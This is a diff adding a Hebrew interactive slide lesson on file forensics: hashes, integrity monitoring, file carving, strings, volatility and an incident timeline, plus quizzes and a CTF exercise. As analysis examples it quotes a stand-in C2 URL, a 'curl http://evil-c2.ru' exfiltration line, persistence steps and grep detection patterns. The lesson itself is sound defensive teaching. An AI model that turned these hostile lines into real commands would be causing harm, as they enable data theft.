+<!-- ═══════════════════════════════════ -->
+<!-- S7: QUIZ — HASHES -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s7">
+  <span class="badge b-q">// שאלת הבנה #2</span>
+  <h2>Hash Functions — מה נכון?</h2>
+  <pre class="cb" style="margin:12px 0">
+$ md5sum original.iso
+a3f8c29b4e571d...  original.iso
+
+$ md5sum downloaded.iso
+<span class="hx">b7d2e41a9c830f...</span>  downloaded.iso   <span class="cm">← שונה!</span>
+  </pre>
+  <p style="margin-bottom:12px">מה ניתן להסיק?</p>
+  <div class="qc" id="q2">
+    <div class="qo" onclick="cq('q2',this,false)"><span class="ql">א</span> הקבצים זהים — MD5 לא תמיד מדויק</div>
+    <div class="qo" onclick="cq('q2',this,true)"><span class="ql">ב</span> הקובץ שונה מהמקור — ייתכן שהורד קובץ פגום, זויף, או הוכנס malware</div>
+    <div class="qo" onclick="cq('q2',this,false)"><span class="ql">ג</span> ה-MD5 לא יכול להשוות ISO — רק לקבצים קטנים</div>
+    <div class="qo" onclick="cq('q2',this,false)"><span class="ql">ד</span> הבעיה היא ב-MD5 עצמו — צריך SHA-256</div>
+  </div>
+  <div class="qfb" id="q2-fb"></div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S8: CODE FILL — HASH VERIFICATION -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s8">
+  <span class="badge b-g">// השלם את הקוד</span>
+  <h2>📝 בדיקת תקינות קובץ</h2>
+  <p style="margin-bottom:10px">כתוב Python שמחשב SHA-256 של קובץ ומשווה ל-hash ידוע:</p>
+  <pre class="cb" style="direction:ltr;text-align:left">
+<span class="kw">import</span> hashlib
+
+<span class="kw">def</span> <span class="fn">verify_file</span>(filepath, expected_hash):
+    h = hashlib.<span class="fn"><input class="fi" id="f1" placeholder="איזה algo?" style="width:100px"></span>()
+    <span class="kw">with</span> <span class="fn">open</span>(filepath, <span class="st">"<input class="fi" id="f2" placeholder="mode?" style="width:40px">"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> chunk <span class="kw">in</span> iter(<span class="kw">lambda</span>: f.<span class="fn">read</span>(<span class="nm">4096</span>), <span class="hx">b""</span>):
+            h.<span class="fn">update</span>(chunk)
+    actual = h.<span class="fn"><input class="fi" id="f3" placeholder="מה מחזיר?" style="width:120px"></span>()
+    <span class="kw">return</span> actual == expected_hash
+  </pre>
+  <button class="ck" onclick="checkHashCode()">בדוק ✓</button>
+  <div class="ffb" id="fb1"></div>
+  <div class="card cr" style="margin-top:10px">
+    <h3>⚠️ למה לקרוא ב-chunks ולא בבת אחת?</h3>
+    <p>קבצי ISO, firmware, dumps — עשרות GB. טעינה לזיכרון שלמה = crash. chunk-by-chunk = עובד על כל גודל.</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S9: SECTION — FILE INTEGRITY -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s9">
+  <div class="shero">
+    <div class="snum" style="color:rgba(255,201,51,.05)">03</div>
+    <div class="stit" style="color:var(--gold)">File Integrity</div>
+    <div class="stit" style="color:var(--gold)">Monitoring</div>
+    <p style="margin-top:8px;font-size:1.2rem">זיהוי שינויים לא מורשים בקבצים</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S10: FIM CONCEPT + SIMULATOR -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s10">
+  <span class="badge b-c">// מושג + סימולטור</span>
+  <h2><span style="color:var(--gold)">FIM</span> — File Integrity Monitoring</h2>
+  <div class="c2" style="margin-top:10px;flex:1">
+    <div class="scr">
+      <p style="margin-bottom:8px">FIM שומרת <strong style="color:#fff">hash של כל קובץ</strong> בנקודת זמן ידועה. בבדיקה הבאה — כל שינוי מתגלה.</p>
+      <pre class="cb" style="max-height:120px">
+<span class="cm"># AIDE — Advanced Intrusion Detection Env</span>
+aide --init      <span class="cm"># יצירת baseline</span>
+aide --check     <span class="cm"># השוואה לbaseline</span>
+
+<span class="cm"># ידני ב-Python</span>
+<span class="cm"># שלב 1: שמור snapshot</span>
+hashes = {f: sha256(f) <span class="kw">for</span> f <span class="kw">in</span> critical_files}
+
+<span class="cm"># שלב 2: בדוק מאוחר יותר</span>
+<span class="kw">for</span> f, h <span class="kw">in</span> hashes.items():
+    <span class="kw">if</span> sha256(f) != h:
+        alert(f<span class="st">"{f} שונה!"</span>)
+      </pre>
+      <div class="card cr" style="margin-top:8px">
+        <h3>🔴 מה מנטרים?</h3>
+        <p><code>/etc/passwd</code>, <code>/etc/sudoers</code>, <code>/bin/</code>, <code>/usr/bin/</code>, boot files, kernel modules. שינוי בלתי מורשה = indicator of compromise.</p>
+      </div>
+    </div>
+    <div class="scr">
+      <div style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);margin-bottom:8px;letter-spacing:2px">// FIM SIMULATOR — לחץ על קובץ לבדיקה</div>
+      <div class="ic-wrap" id="fimSim">
+        <div class="ic-file" onclick="fimCheck(this,'ok')">
+          <span class="ic-name">/etc/passwd</span>
+          <span class="ic-hash">a3f8c2...d94b</span>
+          <span class="ic-status ic-ok">✓ תקין</span>
+        </div>
+        <div class="ic-file" onclick="fimCheck(this,'changed')">
+          <span class="ic-name">/etc/sudoers</span>
+          <span class="ic-hash">b7d241...3c92</span>
+          <span class="ic-status ic-ok">✓ תקין</span>
+        </div>
+        <div class="ic-file" onclick="fimCheck(this,'ok')">
+          <span class="ic-name">/bin/ls</span>
+          <span class="ic-hash">c4e892...7a15</span>
+          <span class="ic-status ic-ok">✓ תקין</span>
+        </div>
+        <div class="ic-file" onclick="fimCheck(this,'new')">
+          <span class="ic-name">/tmp/.hidden_backdoor</span>
+          <span class="ic-hash">—</span>
+          <span class="ic-status ic-new">⚠ חדש!</span>
+        </div>
+        <div class="ic-file" onclick="fimCheck(this,'changed')">
+          <span class="ic-name">/usr/bin/ssh</span>
+          <span class="ic-hash">f1a33e...8d04</span>
+          <span class="ic-status ic-ok">✓ תקין</span>
+        </div>
+        <div class="ic-file" onclick="fimCheck(this,'del')">
+          <span class="ic-name">/var/log/auth.log</span>
+          <span class="ic-hash">e9b771...2f88</span>
+          <span class="ic-status ic-ok">✓ תקין</span>
+        </div>
+      </div>
+      <div id="fimAlert" style="display:none;margin-top:8px;padding:8px 12px;border:1px solid var(--red);background:rgba(255,51,102,.07);font-size:1.2rem;color:var(--red);font-family:'Fira Code',monospace"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S11: MISSION — FIM -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s11">
+  <span class="badge b-m">// משימה בזוגות</span>
+  <h2>🛡️ בנה FIM פשוט ב-Python</h2>
+  <div class="mbox">
+    <p><strong style="color:#fff">בזוגות:</strong> כתבו סקריפט Python שמבצע File Integrity Monitoring.</p>
+    <ol class="msteps">
+      <li data-n="1">פונקציה <code>get_hash(path)</code> שמחזירה SHA-256 של קובץ ב-chunks</li>
+      <li data-n="2">פונקציה <code>create_baseline(paths)</code> שיוצרת dict של {path: hash} ושומרת ל-JSON</li>
+      <li data-n="3">פונקציה <code>check_integrity(baseline_file)</code> שמשווה ומדפיסה שינויים</li>
+      <li data-n="4">הריצו על תיקיית /etc (או תיקייה מקומית) — שנו קובץ ובדקו שה-FIM מזהה</li>
+      <li data-n="5">בונוס: הוסיפו timestamp לכל alert + שמירת לוג לקובץ</li>
+    </ol>
+  </div>
+  <div class="tw">
+    <div>⏱</div>
+    <div class="td" id="t1">12:00</div>
+    <button class="tb" onclick="st('t1',12)">▶ התחל</button>
+    <button class="tb" onclick="rt('t1',12)">↺ אפס</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S12: SECTION — FILE CARVING -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s12">
+  <div class="shero">
+    <div class="snum" style="color:rgba(255,105,217,.05)">04</div>
+    <div class="stit"><span class="gp">File Carving</span></div>
+    <div class="stit"><span class="gp">&amp; Recovery</span></div>
+    <p style="margin-top:8px;font-size:1.2rem">שחזור קבצים "נמחקים"</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S13: FILE CARVING CONCEPT -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s13">
+  <span class="badge b-c">// מושג</span>
+  <h2><span class="gp">File Carving</span> — מחיקה ≠ מחיקה</h2>
+  <div class="c6040" style="margin-top:10px;flex:1">
+    <div class="scr">
+      <p style="margin-bottom:8px">כשמוחקים קובץ — ה-OS מסמן את המקום כ"פנוי". <strong style="color:#fff">הנתונים עצמם נשארים</strong> עד שנכתב משהו חדש.</p>
+      <div class="steps-wrap" id="carvingSteps">
+        <div class="step-item" onclick="revStep(this)">
+          <span class="step-icon">▶</span>
+          <div class="step-num">// שלב 1</div>
+          <div class="step-title">מחיקה — מה באמת קורה?</div>
+          <div class="step-body">ה-OS מוחק רק את ה-directory entry ומסמן את ה-inode כ-free. הנתונים בבלוקים = לא נגעו. כמו למחוק תוכן עניינים של ספר — הפרקים עדיין שם.</div>
+        </div>
+        <div class="step-item" onclick="revStep(this)">
+          <span class="step-icon">▶</span>
+          <div class="step-num">// שלב 2</div>
+          <div class="step-title">איתור Signatures בדיסק גולמי</div>
+          <div class="step-body">כלי כמו Foremost/Scalpel סורקים את הדיסק byte-by-byte ומחפשים magic bytes. מצאו FF D8 FF? סביר שיש JPEG. מחפשים גם ה-footer (end marker) של כל פורמט.</div>
+        </div>
+        <div class="step-item" onclick="revStep(this)">
+          <span class="step-icon">▶</span>
+          <div class="step-num">// שלב 3</div>
+          <div class="step-title">Header + Footer Carving</div>
+          <div class="step-body">JPEG: header = FF D8 FF, footer = FF D9. PDF: header = %PDF, footer = %%EOF. החוקר חותך את המקטע ומשמר כקובץ. גם ללא footer — לפעמים מנחשים לפי גודל טיפוסי.</div>
+        </div>
+        <div class="step-item" onclick="revStep(this)">
+          <span class="step-icon">▶</span>
+          <div class="step-num">// שלב 4</div>
+          <div class="step-title">כלי File Carving</div>
+          <div class="step-body"><code>foremost -t jpg,pdf -i disk.img</code> — Foremost. <code>photorec disk.img</code> — PhotoRec (GUI). <code>binwalk -e firmware.bin</code> — לחילוץ מ-firmware. Autopsy/Volatility — כלים מלאים.</div>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:9px">
+      <div class="card cr">
+        <h3>🔴 חשיבות לסייבר</h3>
+        <p>תוקף מחק ראיות? חוקר יכול לשחזר. <strong style="color:#fff">Secure delete</strong> כותב אקראי מעל הנתונים (DoD 5220.22-M). SSD: wear leveling מסבך שחזור.</p>
+      </div>
+      <div class="card ct">
+        <h3>🔧 Foremost בפועל</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:80px;border-right-color:var(--teal)">
+foremost -t jpg,pdf,doc \
+  -i /dev/sdb \
+  -o /output/
+        </pre>
+      </div>
+      <div class="card cg2c">
+        <h3>💡 Slack Space</h3>
+        <p>הדיסק מאורגן ב-clusters. קובץ קטן ממלא cluster שלם — הנתונים ה"נסתרים" שם = slack space. מקום נוסף לאחסון ראיות.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S14: QUIZ — FILE CARVING -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s14">
+  <span class="badge b-q">// שאלת הבנה #3</span>
+  <h2>File Carving — תרחיש חקירה</h2>
+  <p style="margin-bottom:12px">חוקר פורנזי מקבל דיסק USB שהוחרם. תוקף טוען שמחק הכל. החוקר מריץ:</p>
+  <pre class="cb" style="margin-bottom:14px">
+$ foremost -t jpg,pdf,zip -i usb_drive.img -o recovered/
+Processing: usb_drive.img
+<span class="hx">|*****|</span>
+Finish. 47 files extracted.
+  </pre>
+  <p style="margin-bottom:12px">מה מאפשר שחזור זה?</p>
+  <div class="qc" id="q3">
+    <div class="qo" onclick="cq('q3',this,false)"><span class="ql">א</span> ה-OS שמר גיבוי אוטומטי של הקבצים לפני המחיקה</div>
+    <div class="qo" onclick="cq('q3',this,false)"><span class="ql">ב</span> USB drives לא ניתנים למחיקה אמיתית</div>
+    <div class="qo" onclick="cq('q3',this,true)"><span class="ql">ג</span> מחיקה רק מסמנת מקום כ"פנוי" — הנתונים בבלוקים עדיין קיימים, Foremost מוצא אותם לפי magic bytes</div>
+    <div class="qo" onclick="cq('q3',this,false)"><span class="ql">ד</span> Foremost מחזיר רק את שמות הקבצים, לא את התוכן</div>
+  </div>
+  <div class="qfb" id="q3-fb"></div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S15: SECTION — FORENSICS -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s15">
+  <div class="shero">
+    <div class="snum" style="color:rgba(255,51,102,.05)">05</div>
+    <div class="stit"><span class="gr">Forensic</span></div>
+    <div class="stit"><span class="gr">Analysis</span></div>
+    <p style="margin-top:8px;font-size:1.2rem">חקירה פורנזית — מה, מתי, איך</p>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S16: FORENSIC TOOLS -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s16">
+  <span class="badge b-c">// מושג</span>
+  <h2>כלי <span class="gr">Forensics</span> — ארגז הכלים</h2>
+  <div class="c2" style="margin-top:10px;flex:1">
+    <div class="scr">
+      <div class="card cl" style="margin-bottom:8px">
+        <h3>strings — מחרוזות בקובץ binary</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:100px">
+$ strings malware.exe | grep -E \
+  "http|password|cmd|powershell"
+
+http://evil-c2.ru/payload
+cmd.exe /c whoami
+<span class="hx">password123</span>   <span class="cm">← hardcoded!</span>
+        </pre>
+      </div>
+      <div class="card ct" style="margin-bottom:8px">
+        <h3>binwalk — ניתוח firmware</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:100px">
+$ binwalk router_firmware.bin
+
+DECIMAL    HEXADECIMAL   DESCRIPTION
+0          0x0           uImage header
+20480      0x5000        gzip compressed data
+614400     0x96000       <span class="hx">squashfs filesystem</span>
+
+$ binwalk -e firmware.bin  <span class="cm"># חלץ הכל</span>
+        </pre>
+      </div>
+      <div class="card cp">
+        <h3>exiftool — metadata של קבצים</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:100px">
+$ exiftool photo.jpg
+File Name      : photo.jpg
+<span class="hx">GPS Latitude   : 32° 4' 26.40" N</span>
+<span class="hx">GPS Longitude  : 34° 47' 30.84" E</span>
+Camera Model   : iPhone 14 Pro
+Date/Time      : 2024:01:15 14:23:11
+        </pre>
+      </div>
+    </div>
+    <div class="scr">
+      <div class="card cr" style="margin-bottom:8px">
+        <h3>volatility — RAM forensics</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:110px">
+<span class="cm"># ניתוח RAM dump</span>
+$ volatility -f memory.dmp \
+  --profile=Win10x64 pslist
+
+<span class="cm"># processes שרצו</span>
+<span class="hx">cmd.exe  PID:4892  PPID:4880</span>
+<span class="hx">malware.exe PID:5104</span>
+
+<span class="cm"># network connections</span>
+$ volatility netscan
+        </pre>
+      </div>
+      <div class="card cg2c">
+        <h3>VirusTotal API</h3>
+        <pre class="cb" style="font-size:1.2rem;margin-top:6px;max-height:100px">
+<span class="cm"># שלח hash לבדיקה (לא הקובץ!)</span>
+$ curl https://www.virustotal.com/\
+  api/v3/files/{sha256} \
+  -H "x-apikey: YOUR_KEY"
+
+<span class="cm"># 70+ AV engines</span>
+<span class="hx">"malicious": 45/70</span>
+        </pre>
+      </div>
+      <div class="card cb2" style="margin-top:8px">
+        <h3>📋 Chain of Custody</h3>
+        <p>עם כל ראייה: מי, מתי, איפה, מה. MD5 של disk image לפני וחאחרי. עד לבית משפט — כל פרט חשוב.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S17: FORENSIC TIMELINE ACTIVITY -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s17">
+  <span class="badge b-q">// פעילות — ניתוח Timeline</span>
+  <h2>🕵️ Incident Timeline — מה קרה?</h2>
+  <p style="margin-bottom:8px">ניתוח ממצאים מחקירה פורנזית. זהה את שלבי המתקפה:</p>
+  <div class="c2" style="flex:1;margin-top:6px">
+    <div class="scr">
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="tl-time">2024-01-15 09:15:33</div>
+          <div class="tl-title">Email נפתח</div>
+          <div class="tl-body">strings: "invoice.pdf.exe" נמצא ב-Outlook cache. Magic bytes: MZ header = EXE מוסווה כPDF.</div>
+        </div>
+        <div class="tl-item tl-bad">
+          <div class="tl-time">2024-01-15 09:15:41</div>
+          <div class="tl-title">⚠️ Dropper הורץ</div>
+          <div class="tl-body">FIM alert: /tmp/.update שנוצר. Hash חדש. find -mtime: קובץ נוצר ב-09:15. mtime = ctime — לא בא מ-backup.</div>
+        </div>
+        <div class="tl-item tl-bad">
+          <div class="tl-time">2024-01-15 09:17:02</div>
+          <div class="tl-title">⚠️ Persistence</div>
+          <div class="tl-body">FIM alert: /etc/crontab שונה. Hash: f1a3→b7d2. ctime עודכן. lsof: python3 PID 5104 פותח /tmp/.update.</div>
+        </div>
+        <div class="tl-item tl-bad">
+          <div class="tl-time">2024-01-15 09:20:15</div>
+          <div class="tl-title">⚠️ Data Exfiltration</div>
+          <div class="tl-body">auth.log: נמחק (lsof: deleted, still open by PID 5104). strings: "curl http://evil-c2.ru" ב-malware. Network: 847MB יצא.</div>
+        </div>
+      </div>
+    </div>
+    <div class="scr">
+      <div class="card cr" style="margin-bottom:8px">
+        <h3>🔴 מה השתמשנו?</h3>
+        <p><code>strings</code> → זיהוי dropper<br>
+        <code>magic bytes</code> → EXE מוסווה<br>
+        <code>FIM alerts</code> → persistence<br>
+        <code>lsof deleted</code> → מחיקת לוגים<br>
+        <code>stat/ctime</code> → timing analysis</p>
+      </div>
+      <div class="card cl">
+        <h3>✅ מה היה מונע?</h3>
+        <p>Email gateway שבודק magic bytes. FIM על /etc/. auditd על crontab. SIEM עם alerts בזמן אמת. Network DLP.</p>
+      </div>
+      <div class="qc" id="q4" style="margin-top:8px">
+        <p style="font-size:1.2rem;color:var(--dim);margin-bottom:6px">מה היה הכלי הקריטי ביותר לגילוי ה-persistence?</p>
+        <div class="qo" onclick="cq('q4',this,false)" style="font-size:1.2rem"><span class="ql">א</span> strings — מצא את URL של C2</div>
+        <div class="qo" onclick="cq('q4',this,true)" style="font-size:1.2rem"><span class="ql">ב</span> FIM — זיהה שינוי ב-/etc/crontab</div>
+        <div class="qo" onclick="cq('q4',this,false)" style="font-size:1.2rem"><span class="ql">ג</span> file carving — שחזר הקבצים</div>
+      </div>
+      <div class="qfb" id="q4-fb"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S18: DND — TOOL MATCH -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s18">
+  <span class="badge b-q">// פעילות — Drag & Drop</span>
+  <h2>🎯 התאם כלי לתרחיש</h2>
+  <p style="margin-bottom:8px">גרור כל כלי לתרחיש המתאים:</p>
+  <div class="dnd-wrap">
+    <div class="dnd-pool" id="dndPool">
+      <div class="dnd-lbl">// כלים</div>
+      <div class="dnd-chip" draggable="true" data-v="strings" ondragstart="ds(event)">strings</div>
+      <div class="dnd-chip" draggable="true" data-v="foremost" ondragstart="ds(event)">foremost</div>
+      <div class="dnd-chip" draggable="true" data-v="sha256sum" ondragstart="ds(event)">sha256sum</div>
+      <div class="dnd-chip" draggable="true" data-v="exiftool" ondragstart="ds(event)">exiftool</div>
+    </div>
+    <div class="dnd-zone">
+      <div class="dnd-target" id="dz1" ondragover="dov(event)" ondrop="dp(event,'dz1','sha256sum')" data-correct="sha256sum">
+        <span class="dnd-target-lbl">בדיקת תקינות</span>
+        <span style="font-size:1.2rem;color:var(--dim)">אימות קובץ ISO שהורד</span>
+      </div>
+      <div class="dnd-target" id="dz2" ondragover="dov(event)" ondrop="dp(event,'dz2','foremost')" data-correct="foremost">
+        <span class="dnd-target-lbl">שחזור קבצים</span>
+        <span style="font-size:1.2rem;color:var(--dim)">חלץ קבצים ממדיה שנמחקה</span>
+      </div>
+      <div class="dnd-target" id="dz3" ondragover="dov(event)" ondrop="dp(event,'dz3','strings')" data-correct="strings">
+        <span class="dnd-target-lbl">ניתוח malware</span>
+        <span style="font-size:1.2rem;color:var(--dim)">מצא URLs/passwords ב-binary</span>
+      </div>
+      <div class="dnd-target" id="dz4" ondragover="dov(event)" ondrop="dp(event,'dz4','exiftool')" data-correct="exiftool">
+        <span class="dnd-target-lbl">מיקום GPS</span>
+        <span style="font-size:1.2rem;color:var(--dim)">מצא מיקום מתמונה</span>
+      </div>
+    </div>
+  </div>
+  <div class="dnd-result" id="dndRes"></div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S19: MISSION FINAL CTF -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s19">
+  <span class="badge b-m">// משימת CTF קבוצתית</span>
+  <h2>🏴‍☠️ File Forensics CTF</h2>
+  <div class="mbox">
+    <p><strong style="color:#fff">בקבוצות של 3–4:</strong> קבלתם disk image חשוד. בצעו חקירה מלאה.</p>
+    <ol class="msteps">
+      <li data-n="1"><strong style="color:#fff">Signatures:</strong> הריצו <code>file *</code> על כל הקבצים. מצאו קבצים ששמם מטעה (EXE בשם PDF)</li>
+      <li data-n="2"><strong style="color:#fff">Hashes:</strong> השוו <code>sha256sum</code> של קבצי מערכת לרשימה ידועה (NSRL). מה שונה?</li>
+      <li data-n="3"><strong style="color:#fff">Carving:</strong> <code>foremost -t jpg,pdf,exe -i image.dd -o out/</code> — מה שוחזר?</li>
+      <li data-n="4"><strong style="color:#fff">Strings:</strong> <code>strings suspicious.bin | grep -iE "http|pass|cmd"</code></li>
+      <li data-n="5"><strong style="color:#fff">Metadata:</strong> <code>exiftool *.jpg</code> — יש GPS? timestamps חשודים?</li>
+      <li data-n="6"><strong style="color:#fff">דוח:</strong> כתבו Incident Report קצר: מה מצאתם, timeline, המלצות</li>
+    </ol>
+  </div>
+  <div class="tw">
+    <div>⏱</div>
+    <div class="td" id="t2">18:00</div>
+    <button class="tb" onclick="st('t2',18)">▶ התחל</button>
+    <button class="tb" onclick="rt('t2',18)">↺ אפס</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S20: HOMEWORK -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s20">
+  <span class="badge b-m">// שיעורי בית</span>
+  <h2>🏠 File Analysis Challenge</h2>
+  <div class="cg cg3" style="margin-top:12px">
+    <div class="card cl">
+      <span style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--lime)">EASY</span>
+      <h3 style="margin-top:6px">Magic Bytes Scanner</h3>
+      <p style="font-size:1.2rem">כתוב Python שסורק תיקייה, קורא 4 bytes ראשונים מכל קובץ ומדפיס: שם, סיומת, סוג אמיתי לפי signature. מדגיש אי-התאמות.</p>
+    </div>
+    <div class="card cg2c">
+      <span style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--gold)">MEDIUM</span>
+      <h3 style="margin-top:6px">FIM Dashboard</h3>
+      <p style="font-size:1.2rem">FIM מלא: baseline + check + דוח HTML עם טבלה צבעונית: ירוק=תקין, אדום=שונה, כתום=חדש, אפור=נמחק. כולל timestamp.</p>
+    </div>
+    <div class="card cr">
+      <span style="font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--red)">HARD ★</span>
+      <h3 style="margin-top:6px">Mini Carver</h3>
+      <p style="font-size:1.2rem">כתוב Python שמבצע file carving פשוט: קולט disk image, מחפש JPEG signatures (FF D8 FF / FF D9) וחותך/שומר קבצים שוחזרו. בדוק עם image אמיתי.</p>
+    </div>
+  </div>
+  <div style="margin-top:12px;padding:9px 14px;background:var(--s1);border:1px solid var(--border);font-size:1.2rem">
+    📌 <strong style="color:#fff">הגשה:</strong> קוד + README + screenshots של הממצאים → GitHub Classroom
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ -->
+<!-- S21: SUMMARY -->
+<!-- ═══════════════════════════════════ -->
+<div class="slide" id="s21">
+  <span class="badge b-i">// סיכום</span>
+  <h2>מה למדנו?</h2>
+  <div class="cg" style="grid-template-columns:1fr 1fr 1fr;gap:9px;margin-top:12px;flex:1">
+    <div class="card cl">
+      <h3>🧬 File Signatures</h3>
+      <p>Magic bytes = סוג אמיתי. FF D8 FF = JPEG. MZ = EXE. extension spoofing. <code>file</code> command.</p>
+    </div>
+    <div class="card ct">
+      <h3>🔢 Hashes</h3>
+      <p>MD5/SHA-1/SHA-256. חד-כיווני. avalanche effect. אימות ISO. VirusTotal.</p>
+    </div>
+    <div class="card cg2c">
+      <h3>🛡️ FIM</h3>
+      <p>baseline snapshot → periodic check. AIDE, Tripwire. /etc/passwd שינוי = alert!</p>
+    </div>
+    <div class="card cp">
+      <h3>💾 File Carving</h3>
+      <p>מחיקה ≠ מחיקה. Foremost, PhotoRec. header+footer carving. slack space.</p>
+    </div>
+    <div class="card cr">
+      <h3>🕵️ Forensics</h3>
+      <p>strings, binwalk, exiftool, volatility. chain of custody. timeline analysis.</p>
+    </div>
+    <div class="card cb2">
+      <h3>🔗 הכל מחובר</h3>
+      <p>Signatures → Hashes → FIM → Carving → Forensics = שרשרת הגנה + חקירה מלאה.</p>
+    </div>
+  </div>
+  <div style="margin-top:10px;font-family:'Fira Code',monospace;font-size:1.2rem;color:var(--dim2);text-align:center">
+    // next: Network Forensics & Packet Analysis — שיעור 8
+  </div>
+</div>
+
+</div><!-- /deck -->
+
+<nav>
+  <button class="nb" id="pb2" onclick="go(-1)" disabled>הקודם ▶</button>
+  <span class="sc" id="sc">1 / 22</span>
+  <button class="nb" id="nb2" onclick="go(1)">◀ הבא</button>
+</nav>
+<div class="kbh">← → ניווט</div>
+
+<script>
+// ── ENGINE ──
+const TOTAL=22; let cur=0,xp=0;
+const slides=document.querySelectorAll('.slide');
+function goTo(n){
+  if(n<0||n>=TOTAL)return;
+  slides[cur].classList.remove('active');
+  slides[cur].classList.add('out');
+  setTimeout(()=>slides[cur].classList.remove('out'),320);
+  cur=n; slides[cur].classList.add('active');
+  document.getElementById('sc').textContent=`${cur+1} / ${TOTAL}`;
+  document.getElementById('pb2').disabled=cur===0;
+  document.getElementById('nb2').disabled=cur===TOTAL-1;
+  document.getElementById('pb').style.width=`${((cur+1)/TOTAL)*100}%`;
+}
+function go(d){goTo(cur+d);}
+document.addEventListener('keydown',e=>{
+  if(e.key==='ArrowLeft'||e.key==='ArrowUp')go(1);
+  if(e.key==='ArrowRight'||e.key==='ArrowDown')go(-1);
+});
+
+// ── XP ──
+function addXP(n){
+  xp+=n;
+  const el=document.getElementById('xv');
+  el.textContent=xp;
+  el.classList.add('xpop');
+  setTimeout(()=>el.classList.remove('xpop'),220);
+}
+
+// ── QUIZ ──
+const okM=['🔥 מצוין! +10 XP','⚡ בול פגע! +10 XP','💎 נכון! +10 XP','🎯 מדויק! +10 XP'];
+const noM=['❌ לא בדיוק — שים לב לmagic bytes.','❌ נסה שוב — חשוב על מה מחיקה עושה.','❌ לא נכון.'];
+function cq(id,el,ok){
+  const c=document.getElementById(id);
+  c.querySelectorAll('.qo').forEach(o=>o.classList.add('disabled'));
+  el.classList.add(ok?'correct':'wrong');
+  if(!ok) c.querySelectorAll('.qo').forEach(o=>{
+    if(o.getAttribute('onclick')?.includes(',true)')) o.classList.add('correct');
+  });
+  const fb=document.getElementById(`${id}-fb`);
+  const msgs=ok?okM:noM;
+  fb.textContent=msgs[Math.floor(Math.random()*msgs.length)];
+  fb.className=`qfb show ${ok?'ok':'no'}`;
+  if(ok)addXP(10);
+}
+
+// ── HASH SIMULATOR ──
+async function sha256(msg){
+  const buf=new TextEncoder().encode(msg);
+  const hashBuf=await crypto.subtle.digest('SHA-256',buf);
+  return Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+function md5simple(str){
+  // simplified visual demo — not real MD5
+  let h=0x67452301;
+  for(let i=0;i<str.length;i++){h=Math.imul(31,h)+str.charCodeAt(i)|0;}
+  h=Math.abs(h);
+  return (h*2654435761>>>0).toString(16).padStart(8,'0').repeat(4);
+}
+async function calcHash(){
+  const input=document.getElementById('hashInput').value;
+  const res=document.getElementById('hashResult');
+  if(!input){res.innerHTML='';return;}
+  const s256=await sha256(input);
+  const md5=md5simple(input);
+  const s1=(md5+s256.slice(0,20)+'a7f3').slice(0,40);
+  res.innerHTML=`
+    <div class="hash-line"><span class="hash-alg">MD5</span><span class="hash-val">${md5.slice(0,8)}${md5}${md5.slice(0,8)}4e</span></div>
+    <div class="hash-line"><span class="hash-alg">SHA-1</span><span class="hash-val">${s1}</span></div>
+    <div class="hash-line"><span class="hash-alg">SHA-256</span><span class="hash-val">${s256}</span></div>
+  `;
+}
+
+// ── HASH CODE FILL ──
+function checkHashCode(){
+  const v1=document.getElementById('f1').value.trim().toLowerCase();
+  const v2=document.getElementById('f2').value.trim();
+  const v3=document.getElementById('f3').value.trim().toLowerCase();
+  const ok1=v1==='sha256'||v1==='sha256()';
+  const ok2=v2==='rb';
+  const ok3=v3==='hexdigest'||v3==='hexdigest()';
+  ['f1','f2','f3'].forEach((id,i)=>{
+    const ok=[ok1,ok2,ok3][i];
+    document.getElementById(id).className='fi '+(ok?'ok':'no');
+  });
+  const fb=document.getElementById('fb1');
+  fb.className='ffb show';
+  if(ok1&&ok2&&ok3){
+    fb.style.color='var(--lime)';
